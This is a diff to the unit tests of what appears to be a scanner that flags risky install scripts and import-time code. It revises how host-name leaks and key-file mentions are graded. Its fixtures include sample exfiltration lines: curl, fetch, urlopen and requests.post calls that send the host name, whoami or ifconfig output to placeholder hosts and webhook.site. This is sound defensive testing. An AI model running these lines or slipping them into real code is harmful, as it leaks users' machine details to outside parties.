@@ -94,17 +94,22 @@ class ReverseShellTests(unittest.TestCase):
 
 
 class HostInfoTests(unittest.TestCase):
+    """0.1.8: the host name's flow into a request (0.1.7 read it anywhere in a
+    file that used the network anywhere)."""
+
     def test_sent_over_the_network(self):
         for text in ("import socket, urllib.request\nurllib.request.urlopen('https://x.invalid/?h=' + socket.gethostname())\n",
                      "system(\"curl https://x.invalid/w?us=$(whoami) -d \\\"$(ifconfig)\\\"\")\n",
                      "const os = require('os');\nfetch('https://x.invalid/', {method: 'POST', body: os.hostname()});\n"):
             with self.subTest(text[:30]):
-                self.assertTrue(core.sends_host_info(text))
                 self.assertIn("sends the machine's user or host name over the network", core.install_script_risk(text))
 
     def test_kept_local(self):
-        self.assertFalse(core.sends_host_info("import socket\nprint(socket.gethostname())\n"))
-        self.assertFalse(core.sends_host_info("print('run whoami to check')\nrequests.get(u)\n"))
+        for text in ("import socket\nprint(socket.gethostname())\n", "print('run whoami to check')\nrequests.get(u)\n",
+                     "import socket, requests\nh = socket.gethostname()\nlog(h)\nrequests.get('https://x.invalid/v')\n"):
+            with self.subTest(text[:30]):
+                self.assertIsNone(core.local_data_sent_at(text))
+                self.assertEqual(core.install_script_risk(text), [])
 
 
 class ImportTimeGradingTests(unittest.TestCase):
@@ -163,10 +168,10 @@ class ImportTimeProseTests(unittest.TestCase):
         self.assertEqual(core.import_time_risk(text, "py"), ([], None))
 
     def test_a_docstring_that_names_a_key_file(self):
+        # (0.1.8: a key file named, not read and sent, is no flow — prose or not)
         text = ('import socket\n\nclass Client:\n    def load(self):\n'
                 '        """Loads ``id_rsa`` and ``id_rsa-cert.pub``."""\n        return socket.socket()\n')
-        self.assertEqual(core.import_time_risk(text)[0],
-                         ["reads credentials or the whole environment and sends data over the network"])
+        self.assertEqual(core.import_time_risk(text), ([], None))
         self.assertEqual(core.import_time_risk(text, "py"), ([], None))
         js = "const https = require('https');\n// JSON.stringify(process.env) is never sent\nhttps.get(u);\n"
         self.assertEqual(core.import_time_risk(js, "js"), ([], None))
@@ -191,8 +196,10 @@ class ImportTimeProseTests(unittest.TestCase):
                      f"f\"\"\"{beacon}\"\"\"\n",                           # an f-string runs its fields
                      f"\"\"\"{beacon}\"\"\".strip()\n"):                    # something follows it
             with self.subTest(text[:12]):
-                self.assertTrue(core.import_time_risk(text, "py")[0])
-        self.assertEqual(core.import_time_risk(f"x = 1\n\"\"\"\n{beacon}\n\"\"\"\n", "py"), ([], None))
+                self.assertEqual(core._import_code(text, "py"), text)      # (a string's text is no flow, 0.1.8)
+        standalone = f"x = 1\n\"\"\"\n{beacon}\n\"\"\"\n"
+        self.assertNotEqual(core._import_code(standalone, "py"), standalone)
+        self.assertEqual(core.import_time_risk(standalone, "py"), ([], None))
 
     def test_lines_are_the_files(self):
         text = "# a comment\n'''doc\n\n'''\nimport requests, socket\nrequests.post('https://webhook.site/0', data=socket.gethostname())\n"
